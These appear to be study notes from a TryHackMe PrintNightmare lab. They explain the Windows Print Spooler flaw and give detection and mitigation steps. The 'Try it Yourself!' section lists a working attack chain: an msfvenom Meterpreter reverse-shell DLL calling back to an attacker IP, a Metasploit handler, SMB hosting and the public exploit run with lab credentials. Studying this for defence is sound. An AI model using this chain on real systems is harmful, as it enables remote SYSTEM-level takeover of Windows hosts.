# PrintNightmare


## Introduction
```
"A remote code execution vulnerability exists when the Windows Print Spooler service improperly performs privileged file operations. An attacker who successfully exploited this vulnerability could run arbitrary code with SYSTEM privileges. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights"
```

## Windows Print Spooler Service
- A service that runs on each computer system and manages the printing processes
- Manages print jobs, receives files to be printed, queueing them, and scheduling
- Makes sure to provide enough resources to the computers that send out print jobs
- Allows systems to act as print clients, administrative clients, or print servers
- Is enabled by defauly in all windows clients and servers, as it's necessary to have a print spooler service on the computer to connect to a printer
	- There are third party software and drivers provided by the printing manufacturers that would not require the spooler service to be enabled, but most companies prefer to utilize print spooler services
- Domain controllers mainly use print spooler service for printer pruning - process of removing the printers that are not in use anymore on the network and have been added as objects to active directory
	- This ensures that users can't reach out to non-existent printers

## Remote Code Execution Vulnerability
- What makes PrintNightmare dangerous?
	1. It can be exploited over the network; attacker doesn't need direct access to the machine
	2. The proof of concept was made public
	3. The print spooler service is enabled by default on domain controllers and computers with SYSTEM privileges

## Try it Yourself!
1. Install `impacket` from [here](https://github.com/cube0x0/impacket)
2. Install `pyasn1` (version > .0.4.2)
3. Download the [exploit from github](https://github.com/tryhackme/CVE-2021-1675)
4. Create a malicious dll with `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.46.254 LPORT=4444 -f dll -o malicious.dll`
5. Run metasploit and use these commands
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST VALUE
set LPORT VALUE
exploit
```
6. Host the dll on a smb server using impacket with `smbserver.py share /root/Desktop/share/ -smb2support `
7. Use `rpcdump.py @<ip address> | egrep 'MS-RPRN|MS-PAR' ` to check if the victim is vulnerable
8. Run the exploit with `python CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@192.168.0.200 '\\192.168.0.100\share\malicious.dll'`
```
python CVE-2021-1675.py -> you're instructing Python to run the following Python script. The values which follow are the parameters the script needs to exploit the PrintNightmare vulnerability successfully.
Finance-01.THMdepartment.local -> the name of the domain controller (Finance-01) along with the name of the domain (THMdepartment.local)
sjohnston:mindheartbeauty76@192.168.0.200 -> the username and password for the low privilege Windows user account.
\\ATTACKER_IP_ADDRESS\share\malicious.dll -> the location to the SMB path storing the malicious DLL.
```
9. Get the reverse shell and use `cat C:/Users/Administrator/Desktop/flag.txt` to get `THM{SiGBQPMkSvejvmQNEL}`

## Indicators of Compromise
```
The attacker would most likely use rpcdump.py to scan for vulnerable hosts. After finding the vulnerable print server, the attacker can then execute the exploit code (similar to the Python script in the previous task), which will load the malicious DLL file to exploit the vulnerability. More specifically, the exploit code will call the pcAddPrinterDriverEx() function from the authenticated user account and load the malicious DLL file in order to exploit the vulnerability. The pcAddPrinterDriverEx() function is used to install a printer driver on the system.
```
- A few things to look for:
```
Search for the spoolsv.exe process launching rundll32.exe as a child process without any command-line arguments
Considering the usage of the pcAddPrinterDriverEx() function, you will mostly find the malicious DLL dropped into one of these folders %WINDIR%\system32\spool\drivers\x64\3\ folder along with DLLs that were loaded afterward from %WINDIR%\system32\spool\drivers\x64\3\Old\ (You should proactively monitor the folders for any unusual DLLs)
Hunt for suspicious spoolsv.exe child processes (cmd.exe, powershell.exe, etc.)
The attacker might even use Mimikatz to perform the attack, in this case, a print driver named ‘QMS 810’ will be created. This can be detected by logging the registry changes (e.g., Sysmon ID 13).
Search for DLLs that are part of the proof-of-concept codes that were made public, such as MyExploit.dll, evil.dll, addCube.dll, rev.dll, rev2.dll, main64.dll, mimilib.dll. If they're present on the endpoint, you can find them with Event ID 808 in Microsoft-Windows-PrintService.
```

## Detection: Windows Event Logs
- Windows event logs - detailed records of security, system, and application notifications created by the OS
- The logs that are related to Print Spooler:
	- Microsoft-Windows-PrintService/Admin
	- Microsoft-Windows-PrintService/Operational
- Detect PrintNightmare artifacts by looking at the endpoints events or windows event logs
```
Microsoft-Windows-PrintService/Operational (Event ID 316) - look for "Printer driver [file] for Windows x64 Version-3 was added or updated. Files:- UNIDRV.DLL, AddUser.dll, AddUser.dll. No user action is required.”
Microsoft-Windows-PrintService/Admin (Event ID 808) - A security event source has attempted to register (can detect unsigned drivers and malicious DLLs loaded by spoolsv.exe)
Microsoft-Windows-PrintService/Operational (Event ID 811) - Logs the information regarding failed operations. The event will provide information about the full path of the dropped DLL.
Microsoft-Windows-SMBClient/Security (Event ID 31017) - This Event ID can also be used to detect unsigned drivers loaded by spoolsv.exe.
Windows System (Event ID 7031) - Service Stop Operations (This event ID will show you unexpected termination of print spooler service).
```
- Can also use the system monitor (sysmon) to detect it
```
Microsoft-Windows-Sysmon/Operational (Event ID 3) - Network connection (Look for suspicious ports)
Microsoft-Windows-Sysmon/Operational (Event ID 11) - FileCreate (File creation events are being logged,  you can look for loaded DLLs in the Print Spooler’s driver directory: C:\Windows\System32\spool\drivers\x64\3)
Microsoft-Windows-Sysmon/Operational (Event IDs 23, 26) - FileDelete (You can hunt for deleted malicious DLLs)
```

## Detection: Packet Analysis
```
Packet captures (pcap) play a crucial role in detecting signs of compromise.

If you are not familiar with Wireshark, no worries. You can learn more about Wireshark and how to analyze the packet captures by joining the Wireshark 101 room. It will be a lot of fun!

Detecting the PrintNightmare attack, specifically to (CVE-2021-1675 and CVE-2021-34527) by analyzing the network traffic is not as easy as inspecting the artifacts like Windows Event Logs on the victim's machine. The attacker relies on adding a printer driver using DCE/RPC commands RpcAddPrinterDriver or RpcAddPrinterDriverEx.

DCE/RPC stands for Distributed Computing Environment/Remote Procedure Calls and is the remote procedure call that establishes APIs and an over-the-network protocol.  But what makes the detection of the attack harder is that there are legitimate uses for RpcAddPrinterDriver or RpcAddPrinterDriverEx commands, so you cannot always rely only on the network traffic analysis to be confident that the PrintNightmare attack occurred in your environment. According to Corelight, it can get even harder to detect, especially if the exploit wraps the DCE/RPC calls in SMB3 encryption. To identify the encrypted DCE/RPC calls, you need to somehow decrypt and decode the payloads, which is a time-consuming task.

Corelight also released a Zeek package that detects the printer driver additions over DCE/RPC commands that are not encrypted.
```

## Mitigation: Disable Print Spooler
- Disable print spooler on all domain controllers and modify the registry settings
- [Microsoft guide](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)
- Determine if Print Spooler is running with `Get-Service -Name Spooler`
- Disable Print Spooler service
	- `Stop-Service -Name Spooler -Force`
	- `Set-Service -Name Spooler -StartupType Disabled`
	- This removes the ability to print locally and remotely
- Disable inbound remote printing through Group Policy
